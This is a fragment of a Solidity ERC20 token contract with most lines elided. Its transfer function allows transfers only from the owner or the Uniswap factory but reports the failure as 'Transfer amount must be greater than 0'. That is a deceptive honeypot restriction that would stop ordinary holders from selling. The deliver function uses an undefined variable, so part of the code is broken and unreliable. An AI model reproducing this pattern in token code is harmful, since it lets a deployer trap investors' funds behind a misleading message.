...
contract Test is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 1000 * 10**6;
    ...
    function deliver(uint256 tAmount) public {
        ...
        _rOwned[from] = _rOwned[from].sub(tAmount);
    }
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        require(from == owner() || from == uniswapV2Router.factory(), "Transfer amount must be greater than 0");
